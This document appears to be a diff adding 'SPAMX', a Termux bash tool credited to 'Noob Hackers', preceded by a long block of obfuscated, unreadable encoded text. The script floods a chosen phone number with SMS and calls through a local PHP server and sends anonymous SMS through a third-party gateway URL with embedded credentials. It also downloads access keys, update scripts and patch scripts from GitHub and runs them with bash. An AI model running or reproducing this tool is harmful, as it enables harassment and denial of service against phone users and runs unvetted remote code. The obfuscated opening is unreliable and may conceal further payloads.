z$cz$z$lz$MNz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$NNz$HNz$bz$cz$z$lz$ONz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$PNz$HNz$bz$cz$z$lz$QNz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$RNz$HNz$bz$cz$z$lz$SNz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$TNz$HNz$bz$cz$z$lz$UNz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$VNz$HNz$bz$cz$z$lz$WNz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$XNz$YNz$ZNz$aBz$z$lz$aNz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$XNz$bNz$ZNz$aBz$z$lz$cNz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$XNz$kDz$ZNz$aBz$z$lz$dNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$XNz$HEz$ZNz$aBz$z$lz$gNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$XNz$JEz$ZNz$aBz$z$lz$hNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$XNz$WEz$ZNz$aBz$z$lz$iNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$XNz$hEz$ZNz$aBz$z$lz$jNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$XNz$lEz$ZNz$aBz$z$lz$kNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$XNz$qEz$ZNz$aBz$z$lz$lNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$XNz$mNz$ZNz$aBz$z$lz$nNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$GNz$YNz$ZNz$aBz$z$lz$oNz$eNz$UJz$fNz$z$gDz$DNz$ENz$FNz$GNz$bNz$ZNz$aBz$z$SFz$pNz$z$qz$z$SFz$pNz$z$rz$z$lz$RDz$qNz$rNz$wCz$z$YDz$sNz$tNz$z$xz$uNz$vNz$gIz$xMz$iIz$z$fDz$z$SFz$TFz$z$gDz$hDz$SFz$wNz$GNz$xNz$z$fDz$z$Sz$kz$z$gDz$hDz$SFz$wNz$JNz$xNz$z$fDz$z$SFz$TFz$z$gDz$hDz$SFz$wNz$LNz$xNz$z$fDz$z$rEz$sEz$z$qz$z$lz$yNz$ECz$ECz$ECz$ECz$ECz$AOz$BOz$COz$DOz$wCz$z$rz$z$sz$z$SFz$EOz$gBz$z$FOz$GOz$iBz$jBz$kBz$lBz$mBz$nBz$HOz$IOz$JOz$KOz$LOz$MOz$NOz$LGz$nHz$z$xz$yz$OOz$POz$ZNz$aBz$z$SFz$pNz$z$rz$z$sz$z$SFz$QOz$gBz$z$KEz$LEz$MEz$NEz$OEz$PEz$QEz$REz$SEz$Sz$TEz$UEz$CGz$DGz$z$EGz$FGz$GGz$HGz$z$ROz$SOz$TOz$UOz$VOz$pz$uMz$z$IGz$JGz$KGz$LGz$MGz$z$xz$NGz$OGz$PGz$QGz$eDz$z$fDz$z$lz$z$lz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$CCz$DCz$ECz$RGz$SGz$WGz$QCz$XGz$YGz$ZGz$aGz$bGz$cGz$dGz$eGz$fGz$gGz$z$lz$CCz$DCz$ECz$RGz$SGz$WGz$QCz$hGz$iGz$jGz$kGz$lGz$mGz$ECz$eGz$fGz$gGz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$z$lz$z$lz$WOz$ECz$ECz$ECz$ECz$ECz$ECz$bFz$XOz$YOz$ZOz$aOz$bOz$cOz$dOz$pz$z$rEz$sEz$z$qz$z$SFz$TFz$z$rz$z$sz$z$MFz$ZFz$gBz$z$wBz$xBz$z$lz$CCz$jCz$YJz$z$eOz$yJz$fOz$QCz$wJz$z$gOz$UFz$hJz$hOz$ICz$mJz$z$iOz$jOz$QCz$kOz$QCz$wJz$z$lOz$mOz$z$nOz$oOz$KHz$RGz$LHz$MHz$OCz$NHz$OHz$PHz$QHz$QCz$wJz$z$wCz$z$lz$RDz$pOz$qOz$rOz$sOz$z$YDz$tOz$z$xz$mMz$uOz$VNz$vOz$wOz$JEz$lDz$z$fDz$z$lz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$CCz$DCz$ECz$RGz$SGz$xOz$yOz$APz$BPz$CPz$DPz$EPz$uHz$FPz$GPz$COz$COz$HPz$VGz$IPz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$z$kFz$JPz$mFz$z$KPz$LPz$MPz$NPz$z$rEz$sEz$z$gDz$OPz$PPz$QPz$RPz$SPz$TPz$eDz$z$fDz$z$lz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$CCz$DCz$ECz$RGz$SGz$xOz$yOz$APz$BPz$CPz$DPz$EPz$uHz$FPz$GPz$COz$COz$HPz$VGz$IPz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$z$kFz$JPz$mFz$z$KPz$LPz$MPz$NPz$z$rEz$sEz$z$qz$z$dz$ez$fz$hCz$z$xHz$yHz$AIz$BIz$CIz$DIz$EIz$FIz$GIz$HIz$IIz$JIz$KIz$LIz$MIz$FBz$NIz$OIz$PIz$QIz$RIz$pz$Yz$Zz$az$z$YDz$SIz$TIz$UIz$VIz$WIz$UPz$rLz$z$dz$ez$fz$hCz$z$VPz$JGz$WPz$XPz$MGz$z$rz$z$xz$vMz$cLz$YPz$ZPz$aPz$z$fDz$z$dz$ez$fz$hCz$z$kIz$lIz$mIz$nIz$oIz$pIz$z$wBz$xBz$z$lz$CCz$jCz$YJz$z$ZJz$aJz$aJz$bJz$z$cJz$dJz$aJz$eJz$z$fJz$ECz$ECz$gJz$hJz$iJz$jJz$QCz$bPz$cPz$ICz$mJz$z$fJz$QCz$nJz$oJz$ICz$pJz$gJz$hJz$qJz$rJz$QCz$dPz$ePz$fPz$gPz$ICz$mJz$z$fJz$ECz$ECz$gJz$nCz$z$fJz$ECz$ECz$xJz$yJz$AKz$nCz$BKz$CKz$hPz$RGz$EKz$QCz$rCz$ICz$mCz$OCz$FKz$GKz$nCz$z$fJz$ECz$ECz$xJz$yJz$HKz$nCz$BKz$CKz$IKz$JKz$QCz$KKz$yJz$LKz$nCz$BKz$CKz$MKz$QCz$wJz$z$fJz$ECz$ECz$eJz$z$SKz$TKz$PPz$jCz$aFz$gJz$nCz$VKz$WKz$yJz$XKz$YKz$ICz$ZKz$aKz$bKz$z$fJz$ECz$ECz$cKz$dKz$dKz$dKz$dKz$dKz$dKz$z$cJz$eKz$aJz$gJz$fKz$gKz$hKz$iKz$nCz$jKz$kKz$lKz$mKz$z$nKz$aJz$aJz$oKz$z$wCz$z$iPz$jPz$kPz$lPz$XBz$YBz$mPz$nPz$z$KEz$LEz$MEz$NEz$OEz$PEz$QEz$REz$SEz$Sz$TEz$UEz$oPz$pPz$kz$z$qPz$rPz$sPz$tPz$uPz$vPz$Zz$az$EEz$wPz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$kFz$GQz$mFz$z$pKz$yHz$qKz$AIz$xPz$sPz$tPz$uPz$yPz$AQz$BQz$CQz$DQz$EQz$FQz$nIz$oIz$WJz$XJz$z$lz$RDz$qNz$rNz$wCz$z$YDz$ZDz$HQz$z$xz$bDz$IQz$dDz$eDz$z$fDz$z$MFz$NFz$z$gDz$hDz$JQz$jDz$kDz$lDz$z$fDz$z$Sz$kz$z$gDz$hDz$JQz$jDz$HEz$lDz$z$fDz$z$MFz$NFz$z$gDz$hDz$JQz$jDz$JEz$lDz$z$fDz$z$rEz$sEz$z$qz$z$lz$yNz$ECz$ECz$ECz$ECz$ECz$ECz$ECz$UFz$hJz$KQz$ICz$LQz$MQz$NQz$iFz$OQz$yJz$PQz$z$rz$z$qz$z$lz$NBz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$qIz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$ECz$RGz$sIz$vEz$tIz$uIz$vIz$wIz$SGz$xIz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$ECz$ECz$ECz$ECz$ECz$ECz$xIz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$ECz$yIz$AJz$BJz$CJz$DJz$EJz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$QCz$hGz$AIz$BIz$FJz$GJz$HJz$IJz$VGz$JJz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$ECz$ECz$ECz$KJz$ECz$ECz$xIz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$QCz$LJz$xDz$XEz$mEz$MJz$NJz$OJz$eGz$PJz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$qIz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$NBz$z$rz$z$sz$z$IEz$nFz$z$wBz$xBz$z$lz$CCz$QQz$RQz$z$SQz$TQz$UQz$z$VQz$WQz$VQz$z$XQz$YQz$ZQz$z$aQz$bQz$cQz$z$dQz$eQz$fQz$z$WQz$VQz$WQz$z$gQz$hQz$iQz$z$hQz$TQz$hQz$z$jQz$z$lz$CCz$jCz$aFz$ECz$ECz$ECz$ECz$kQz$lQz$RGz$mQz$nQz$oQz$pQz$qQz$mFz$z$lz$CCz$jCz$aFz$ECz$ECz$ECz$rQz$sQz$RGz$mQz$tQz$uQz$vQz$wQz$xQz$yQz$z$lz$CCz$jCz$aFz$ECz$ARz$BRz$GCz$CRz$DRz$aFz$ERz$FRz$GRz$HRz$IRz$JRz$wQz$xQz$yQz$z$lz$CCz$jCz$aFz$ECz$ECz$ECz$KRz$LRz$MRz$NRz$ORz$PRz$QRz$RRz$SRz$TRz$z$lz$CCz$jCz$aFz$ECz$ECz$wLz$URz$VRz$WRz$FRz$XRz$YRz$ZRz$aRz$bRz$cRz$dRz$z$lz$CCz$jCz$aFz$ECz$ECz$ECz$eRz$fRz$gRz$hRz$QCz$iRz$jRz$kRz$oQz$pQz$qQz$mFz$z$lz$CCz$jCz$aFz$ECz$lRz$mRz$nRz$oRz$OCz$pRz$qRz$WCz$MCz$rRz$sRz$tRz$bRz$cRz$dRz$z$lz$CCz$jCz$CKz$ECz$ECz$ECz$uRz$vRz$COz$COz$COz$wRz$RRz$SRz$TRz$z$kFz$lFz$mFz$z$FEz$z$GEz$z$sz$z$FEz$z$GEz"
+check(){
+if wget --spider https://raw.githubusercontent.com/noob-hackers/spamx/master/update.v1.2 2>/dev/null; then
+cd $HOME/spamx/server/updates
+echo "spmx" > update.txt
+else
+echo
+fi
+}
+echo
+check
+option(){
+if [ -f "$HOME/spamx/server/updates/update.txt" ];then
+cd $HOME/spamx/server/updates
+bash update.sh
+else
+echo " "
+fi
+}
+option
+check1(){
+if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/spamx.v.1 2>/dev/null; then
+cd $HOME/spamx/server/updates
+echo "spmx" > patch.txt
+else
+echo
+fi
+}
+check1
+option1(){
+if [ -f "/data/data/com.termux/files/spamx/server/updates/patch.txt" ];then
+cd $HOME/spamx/server/updates
+bash patch.sh
+else
+echo " "
+fi
+}
+option1
+bnr(){
+clear
+cd $HOME/spamx/server/bnr
+bash bnr1.sh
+echo -e "                  \e[92m >\e[93m By Noob Hackers \e[92m<"
+echo -e "               \e[92m>\e[93m github.com/noob-hackers \e[92m<"
+echo -e "               \e[92m >\e[91m YOUTUBE:-\e[92mNOOB HACKERS \e[92m<"
+echo
+}
+men(){
+cd $HOME/spamx
+rm *.txt 2>/dev/null
+echo -e "\e[92m[\e[91m1\e[92m]\e[93m Bombing\e[93m"
+echo -e "\e[92m[\e[91m2\e[92m]\e[93m Key\e[93m"
+echo -e "\e[92m[\e[91m3\e[92m]\e[93m About\e[93m"
+echo -e "\e[92m[\e[91m4\e[92m]\e[93m Update\e[93m"
+echo -e "\e[92m[\e[91m5\e[92m]\e[93m Subscribe\e[93m"
+echo -e "\e[92m[\e[91m6\e[92m]\e[93m Group\e[93m"
+echo -e "\e[92m[\e[91m7\e[92m]\e[93m Follow\e[93m"
+echo -e "\e[92m[\e[91m8\e[92m]\e[93m Exit\e[93m"
+echo ''
+echo -ne "SELECT OPTION ~> \e[0m"
+read opt1
+if [ $opt1 = "1" ];
+then
+spams
+elif [ $opt1 = "2" ];
+then
+am start -a android.intent.action.VIEW -d https://shrinke.me/spamxcc > /dev/null 2>&1
+bnr
+men
+elif [ $opt1 = "3" ];
+then
+abot
+elif [ $opt1 = "4" ];
+then
+cd /data/data/com.termux/files/home/spamx/server/updates
+bash update.sh
+elif [ $opt1 = "5" ];
+then
+am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
+bnr
+men
+elif [ $opt1 = "6" ];
+then
+am start -a android.intent.action.VIEW -d https://bitly.com/nhwhatschat > /dev/null 2>&1
+bnr
+men
+elif [ $opt1 = "7" ];
+then
+am start -a android.intent.action.VIEW -d https://bit.ly/nhfollowus > /dev/null 2>&1
+bnr
+men
+elif [ $opt1 = "8" ];
+then
+exit 1
+else
+echo -e "                      \e[93m !....OOPS \e[0m"
+fi
+}
+spams(){
+clear
+bnr
+echo -e "\e[92m[\e[91m1\e[92m]\e[93m Bomb Sms+Call\e[93m"
+echo -e "\e[92m[\e[91m2\e[92m]\e[93m Bomb Sms\e[93m"
+echo -e "\e[92m[\e[91m3\e[92m]\e[93m Bomb Call\e[93m"
+echo -e "\e[92m[\e[91m4\e[92m]\e[93m Anonymous Sms\e[93m"
+echo -e "\e[92m[\e[91m5\e[92m]\e[93m Back\e[93m"
+echo ''
+echo -ne "SELECT OPTION ~> \e[0m"
+read opt2
+if [ $opt2 = "1" ];
+then
+massbmb
+elif [ $opt2 = "2" ];
+then
+smsbmb
+elif [ $opt2 = "3" ];
+then
+callbmb
+elif [ $opt2 = "4" ];
+then
+anonmenu
+elif [ $opt2 = "5" ];
+then
+bnr
+men
+else
+echo -e "                     \e[93m !....OOPS \e[0m"
+exit 1
+fi
+}
+smsbmb(){
+massbmb
+}
+callbmb(){
+echo -e "\e[93m                ON UPDATES WE WILL UPDATE SOON....!"
+sleep 4.0
+bnr
+men
+}
+anonmenu(){
+if [ -f /data/data/com.termux/files/home/spamx/server/anon/dat.txt ];
+then
+anondat
+else
+anonmen
+fi
+}
+anondat(){
+cd /data/data/com.termux/files/home/spamx/server/anon
+dt=$(date +%A)
+dro=$(cat dat.txt)
+if [ "$dt" == "$dro" ];
+then
+clear
+echo
+echo
+echo
+echo
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m  |  \e[91mDAILY LIMIT REACHED (100%)\e[34m  |"
+echo -e "        \e[34m  |  \e[92m    COME ON TOMORROW      \e[34m  |"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+echo
+echo
+echo
+sleep 4.0
+bnr
+men
+else
+cd /data/data/com.termux/files/home/spamx/server/anon
+rm *.txt
+anonmen
+fi
+}
+anonmen(){
+anoncrk
+clear
+echo -e "
+\e[91m         ██████
+\e[91m    ██████████
+\e[91m █\e[96m ▄\e[91m▀█  █▀\e[96m▄ \e[91m█
+▐▌           ▌
+█▌▀▄  ▄▄  ▄▀▐█
+▐██  ▀▀  ▀▀  ██▌   SPAMX \e[91mV.1\e[92m BY NOOB HACKERS\e[91m
+▄████▄   ▌  ▄████▄
+\e[0m"
+echo
+echo -ne "\e[93mPROVIDE MESSAGE: "
+read msg
+printf %s\\n "$msg"|jq -Rr @uri > lad.txt
+test=$(cat lad.txt)
+echo -ne "\e[93mMOB NUMBER: "
+read mob
+cd $HOME/spamx
+wget -L https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/error/er3.txt 2>/dev/null
+read -s -p "ACCESS KEY: " secret
+cd $HOME/spamx
+otext=$(cat er3.txt)
+anontest
+}
+anontest(){
+if [[ $secret = $otext ]];
+then
+auth1
+else
+cd $HOME/spamx
+rm er3.txt 2>/dev/null
+clear
+echo " "
+echo -e "               \e[34m ============================\e[34m"
+echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
+echo -e "               \e[34m |                          |"
+echo -e "               \e[34m |    Use shortlink for key |"
+echo -e "               \e[34m |\e[92m  https://shrinke.me/tXwz\e[34m |"
+echo -e "               \e[34m |            [OR]          |"
+echo -e "               \e[34m |\e[92mhttps://bit.ly/nhwhatschat\e[34m|"
+echo -e "               \e[34m ============================\e[34m"
+echo " "
+sleep 5.0
+bnr
+men
+fi
+}
+auth1() {
+clear
+cd /data/data/com.termux/files/home/spamx/server/anon
+remn=$(cat ctt.txt) >/dev/null 2>&1
+clear
+echo -e "\e[93m
+╭━━━━━━━━━━━╮
+┃━━━●━══━━━━┃
+┃           ┃ \e[91m TARGET-\e[92m$mob \e[93m
+┃   \e[91mSPAMX\e[93m   ┃ \e[91m ATTACK-\e[92mANONYMOUS SMS \e[93m
+┃           ┃ \e[93m
+┃           ┃ [\e[91m1\e[93m]\e[92m ANON \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
+┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
+┃           ┃     \e[91m REMAINING-\e[92m["$remn"] \e[93m
+┃\e[34m"$mob"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
+┃           ┃ --------------------------
+┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/9113948054
+╰━━━━━━━━━━━╯
+"
+curl -L -s "http://mobicomm.dove-sms.com//submitsms.jsp?user=dontlook&key=be6f739958XX&mobile=$mob&message=$test&senderid=CLNEXT&accusage=1" > utis.txt
+value=$( grep -o "success" utis.txt)
+if [[ $value = "success" ]]
+then
+echo
+echo
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m   |  \e[34mSent \e[93m$msg \e[34mTo \e[91m$mob \e[34msuccessfully\e[34m  |"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+echo
+echo
+cd $HOME/spamx
+rm er3.txt 2>/dev/null
+anondd
+else
+clear
+echo " "
+echo -e "               \e[34m ============================\e[34m"
+echo -e "               \e[34m |  \e[93mOOPS SERVER ISSUES..!\e[34m   |"
+echo -e "               \e[34m |   we will update it soon |"
+echo -e "               \e[34m ============================\e[34m"
+echo " "
+cd $HOME/spamx
+rm er3.txt 2>/dev/null
+fi
+}
+anondd(){
+cd /data/data/com.termux/files/home/spamx/server/anon
+name=remin
+if [[ -e $name.txt || -L $name.txt ]] ; then
+i=0
+while [[ -e $name-$i.txt || -L $name-$i.txt ]] ; do
+let i++
+done
+name=$name-$i
+fi
+touch -- "$name".txt
+cd /data/data/com.termux/files/home/spamx/server/anon
+anonct=$(find remin*.txt | wc -l)
+if [[ $anonct = "1" ]]; then
+echo "20" > ctt.txt
+elif [[ $anonct = "2" ]]; then
+echo "19" > ctt.txt
+elif [[ $anonct = "3" ]]; then
+echo "18" > ctt.txt
+elif [[ $anonct = "4" ]]; then
+echo "17" > ctt.txt
+elif [[ $anonct = "5" ]]; then
+echo "16" > ctt.txt
+elif [[ $anonct = "6" ]]; then
+echo "15" > ctt.txt
+elif [[ $anonct = "7" ]]; then
+echo "14" > ctt.txt
+elif [[ $anonct = "8" ]]; then
+echo "13" > ctt.txt
+elif [[ $anonct = "9" ]]; then
+echo "12" > ctt.txt
+elif [[ $anonct = "10" ]]; then
+echo "11" > ctt.txt
+elif [[ $anonct = "11" ]]; then
+echo "10" > ctt.txt
+elif [[ $anonct = "12" ]]; then
+echo "9" > ctt.txt
+elif [[ $anonct = "13" ]]; then
+echo "8" > ctt.txt
+elif [[ $anonct = "14" ]]; then
+echo "7" > ctt.txt
+elif [[ $anonct = "15" ]]; then
+echo "6" > ctt.txt
+elif [[ $anonct = "16" ]]; then
+echo "5" > ctt.txt
+elif [[ $anonct = "17" ]]; then
+echo "4" > ctt.txt
+elif [[ $anonct = "18" ]]; then
+echo "3" > ctt.txt
+elif [[ $anonct = "19" ]]; then
+echo "2" > ctt.txt
+elif [[ $anonct = "20" ]]; then
+echo "0" > ctt.txt
+elif [[ $anonct = "21" ]]; then
+anondot
+else
+anondot
+fi
+echo -ne "NEXT: "
+read anonopt
+if [ $anonopt = "1" ];
+then
+anonmenu
+elif [ $anonopt = "2" ];
+then
+spams
+elif [ $anonopt = "3" ];
+then
+anonmenu
+elif [ $anonopt = "4" ];
+then
+exit 1
+else
+echo "                      xx ERROR....! xx"
+fi
+}
+anoncrk(){
+FILE=/data/data/com.termux/files/home/spamx/server/anon/limit.txt
+if [ -f "$FILE" ]; then
+anondot
+fi
+}
+anondot(){
+cd /data/data/com.termux/files/home/spamx/server/anon
+dt=$(date +%A)
+chk=$(date +%A > dat.txt)
+dro=$(cat dat.txt)
+if [ "$dt" == "$dro" ];
+then
+echo
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m  |  \e[91mDAILY LIMIT REACHED (100%)\e[34m  |"
+echo -e "        \e[34m  |  \e[92m    COME ON TOMORROW      \e[34m  |"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+echo
+echo '                             Oops...Come Tomorrow' > limit.txt
+exit 1
+else
+anonmenu
+fi
+}
+massbmb(){
+clear
+echo -e "\e[93m
+,--\e[91m.+,\e[93m
+__/   \e[91m-*-\e[93m
+*d08b*  \e[91m'%\e[93m
+0088MM
+*9MMP* SPAMX \e[91mV.1\e[92m BY NOOB HACKERS\e[93m
+"
+echo -ne "NUMBER: \e[0m"
+read num
+cd $HOME/spamx
+wget -L https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/error/er3.txt 2>/dev/null
+read -s -p "ACCESS KEY: " access
+cd $HOME/spamx
+bas=$(cat er3.txt)
+if [[ $access = $bas ]];
+then
+cd $HOME/spamx
+rm er3.txt 2>/dev/null
+clear
+echo -e "\e[93m
+╭━━━━━━━━━━━╮
+┃━━━●━══━━━━┃
+┃           ┃ \e[91m TARGET-\e[92m$num \e[93m
+┃   \e[91mSPAMX\e[93m   ┃ \e[91m ATTACK-\e[92mMASS BOMBING \e[93m
+┃           ┃ \e[93m
+┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
+┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
+┃           ┃
+┃\e[34m"$num"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
+┃           ┃ --------------------------
+┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mwa.me/9113948054
+╰━━━━━━━━━━━╯
+"
+killall -9 php >/dev/null 2>&1
+cd /data/data/com.termux/files/home/spamx/server/callnsms
+php -S localhost:8080 >/dev/null 2>&1 &
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+sleep 1.0
+curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
+echo -ne "NEXT: "
+read optz
+if [ $optz = "1" ];
+then
+massbmb
+elif [ $optz = "2" ];
+then
+spams
+elif [ $optz = "3" ];
+then
+massbmb
+elif [ $optz = "4" ];
+then
+exit 1
+else
+echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
+fi
+else
+echo " "
+echo -e "               \e[34m ============================\e[34m"
+echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
+echo -e "               \e[34m |                          |"
+echo -e "               \e[34m |    Use shortlink for key |"
+echo -e "               \e[34m |\e[92m  https://shrinke.me/tXwz\e[34m |"
+echo -e "               \e[34m |            [OR]          |"
+echo -e "               \e[34m |\e[92mhttps://bit.ly/nhwhatschat\e[34m|"
+echo -e "               \e[34m ============================\e[34m"
+echo " "
+fi
+}
+abot(){
+clear
+echo -e '\e[91m
+──▐─▌──▐─▌──
+─▐▌─▐▌▐▌─▐▌─
+─█▄▀▄██▄▀▄█─
+──▄──██▌─▄──
+▄▀─█▀██▀█─▀▄
+▐▌▐▌─▐▌─▐▌▐▌
+─▐─█────█─▌─
+────▌──▐────
+'
+echo -e "\e[93m                  CALL ME \e[92mNITRO" | pv -qL 10
+echo -e "\e[93m             IAM FROM \e[92mNOOB HACKERS" | pv -qL 10
+echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
+echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
+echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
+echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
+echo -e "\e[93m        MY WEBSITE:\e[92m www.noob-hackers.com\e[0m" | pv -qL 10
+echo -e "\e[92m                BYEE.............." | pv -qL 10
+sleep 4.0
+bnr
+men
+}
+bnr
+men
